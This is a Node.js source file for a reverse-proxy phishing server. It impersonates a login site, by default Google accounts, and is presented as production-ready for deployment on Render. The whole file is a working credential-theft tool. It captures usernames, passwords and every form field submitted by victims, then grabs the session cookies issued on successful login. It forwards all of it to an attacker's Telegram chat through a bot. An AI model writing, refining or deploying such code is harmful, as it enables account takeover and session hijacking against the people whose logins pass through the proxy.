/*
 * =================================================================
 *  Sam's Reverse Proxy - Production Ready v2.0
 * =================================================================
 * Fixes deprecation warnings and includes robust error handling.
 * Designed for deployment on Render and similar platforms.
 */

// 1. Import the required libraries
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const TelegramBot = require('node-telegram-bot-api');

// 2. Configuration from Environment Variables
// Platforms like Render use environment variables for secrets. This is secure.
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://accounts.google.com';

// --- Essential Checks ---
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set as environment variables.");
  process.exit(1); // Stop the server if secrets are missing
}

// 3. Initialize Express App and Telegram Bot
const app = express();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

// --- A temporary place to store login data ---
// Using a Map is more efficient for this use case than a plain object.
const capturedData = new Map();

// 4. Middleware Setup
// To capture the form data (username/password), we need to parse the request body.
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

// This middleware runs BEFORE the proxy to capture outgoing login requests.
const captureRequestData = (req, res, next) => {
  // We only care about POST requests that contain a body.
  if (req.method === 'POST' && req.body) {
    // A simple check to see if the form data looks like a login attempt.
    // Real sites might use different field names like 'email', 'user', 'login'.
    if (req.body.username || req.body.email || req.body.user) {
      console.log(`[+] Capturing potential login data from IP: ${req.ip}`);
      
      // Store the data, using the user's IP as a temporary key.
      capturedData.set(req.ip, {
        username: req.body.username || req.body.email || req.body.user || 'NOT_FOUND',
        password: req.body.password || 'NOT_FOUND',
        allFormData: req.body
      });
    }
  }
  next(); // Pass the request to the next middleware (the proxy)
};

// 5. Proxy Middleware Configuration
const proxy = createProxyMiddleware({
  target: TARGET_WEBSITE,
  changeOrigin: true, // Needed for virtual hosted sites
  followRedirects: true, // Important for login flows that redirect
  selfHandleResponse: true, // We want to intercept the response to grab cookies

  // This function runs when the response comes back from the target website.
  onProxyRes: (proxyRes, req, res) => {
    let body = [];
    proxyRes.on('data', (chunk) => {
      body.push(chunk);
    });

    proxyRes.on('end', async () => { // Make this async to use await for Telegram
      body = Buffer.concat(body).toString();

      // --- Check for session cookies AND send the full data ---
      const setCookieHeader = proxyRes.headers['set-cookie'];
      
      // We check if we have stored data for this user's IP AND we received cookies.
      // This combination signals a successful login.
      if (capturedData.has(req.ip) && setCookieHeader) {
        console.log(`[+] Login successful for IP: ${req.ip}. Preparing full data for Telegram.`);
        let loginInfo;
        try {
          loginInfo = capturedData.get(req.ip);
          const sessionCookies = setCookieHeader.join('\n');

          // Create the single, complete, and formatted message.
          const fullMessage = `
--- CAPTURED LOGIN DATA ---
Target: ${TARGET_WEBSITE}
Username: ${loginInfo.username}
Password: ${loginInfo.password}

--- SESSION COOKIES ---
${sessionCookies}

--- ALL FORM DATA ---
${JSON.stringify(loginInfo.allFormData, null, 2)}
          `;
          
          // Send the complete message to Telegram using async/await
          await bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage);
          console.log(`[+] Successfully sent data to Telegram.`);
          
        } catch (error) {
          console.error(`[-] Failed to send data to Telegram: ${error.message}`);
        } finally {
          // Clean up the stored data so we don't send it again on the next request.
          capturedData.delete(req.ip);
        }
      }

      // Forward the original response from the website back to the user's browser.
      res.end(body);
    });
  },
  onError: (err, req, res) => {
    console.error('[-] Proxy error:', err);
    // Send a more user-friendly error page
    res.status(502).send('<h1>Proxy Error</h1><p>Could not connect to the target website.</p>');
  }
});

// 6. Tell the Express app to use our middleware.
app.use(captureRequestData); // This runs first to grab the POST data.
app.use('/', proxy);         // This runs second to forward the request.

// 7. Start the Server
// Use the port provided by the environment (Render) or default to 3000 for local testing.
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`========================================`);
  console.log(`  Sam's Proxy Server is running.`);
  console.log(`  Port: ${PORT}`);
  console.log(`  Target: ${TARGET_WEBSITE}`);
  console.log(`========================================`);
});
